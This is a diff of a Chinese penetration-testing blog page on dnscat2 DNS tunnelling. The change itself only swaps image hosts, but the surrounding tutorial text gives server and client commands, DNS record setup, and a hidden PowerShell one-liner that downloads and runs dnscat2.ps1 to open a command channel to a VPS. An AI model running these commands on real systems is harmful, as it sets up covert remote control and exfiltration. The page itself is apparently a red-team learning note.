@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_14-35-33.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-35-33.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -514,7 +514,7 @@ sudo ruby .&#x2F;dnscat2.rb -s 553 -c teamssix --no-cache<span aria-hidden="true
 <pre class="line-numbers language-none"><code class="language-none">dnscat --dns server&#x3D;172.16.214.50,port&#x3D;553 --secret&#x3D;teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>连接成功后，会提示 <code>Session established!</code></p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-07_16-44-12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_16-44-12.png"></p>
 <p>dnscat2 的一些命令</p>
 <pre class="line-numbers language-none"><code class="language-none">sessions 或 windows 						查看当前会话
 session -i 1 或 window -i 1 		进入 ID 为 1 的会话
@@ -523,13 +523,13 @@ exec						远程打开程序
 download			  下载文件
 help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/WX20210607-165615@2x.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/WX20210607-165615@2x.png"></p>
 <p>抓下包，看看流量是什么样子的</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-07_17-01-52.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-01-52.png"></p>
 <p>不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。</p>
 <h2 id="2、中继模式"><a href="#2、中继模式" class="headerlink" title="2、中继模式"></a>2、中继模式</h2><p>在中继模式下，需要自己有一个域名，并添加两条域名解析记录。</p>
 <p>首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-07_17-20-20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png"></p>
 <p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p>
 <p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p>
 <pre class="line-numbers language-none"><code class="language-none">nslookup ns1.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -537,7 +537,7 @@ help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows
 <p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo tcpdump -n -i eth0 udp dst port 53<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_13-46-54.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_13-46-54.png"></p>
 <p><strong>开启服务端</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -552,9 +552,9 @@ help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows
 <p>也可以把导入的命令和开启客户端的命令放在一起</p>
 <pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_14-35-33.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-35-33.png"></p>
 <p>再来抓下包，看看流量是什么样的</p>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_14-45-40.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-45-40.png"></p>
 <p>可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。</p>
 <blockquote>
 <p>参考文章：</p>
@@ -563,7 +563,7 @@ help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/104429983">https://blog.csdn.net/qq_36119192/article/details/104429983</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -715,7 +715,7 @@ help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows
                 <a href="/210608-213403.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/Snipaste_2021-06-08_21-12-06.png" class="responsive-img" alt="【内网学习笔记】9、iodine 使用">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png" class="responsive-img" alt="【内网学习笔记】9、iodine 使用">
                         
                         <span class="card-title">【内网学习笔记】9、iodine 使用</span>
                     </div>
@@ -771,7 +771,7 @@ help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows
                 <a href="/210604-154036.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/ssh4.png" class="responsive-img" alt="【内网学习笔记】SSH 隧道使用学习">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh4.png" class="responsive-img" alt="【内网学习笔记】SSH 隧道使用学习">
                         
                         <span class="card-title">【内网学习笔记】SSH 隧道使用学习</span>
                     </div>
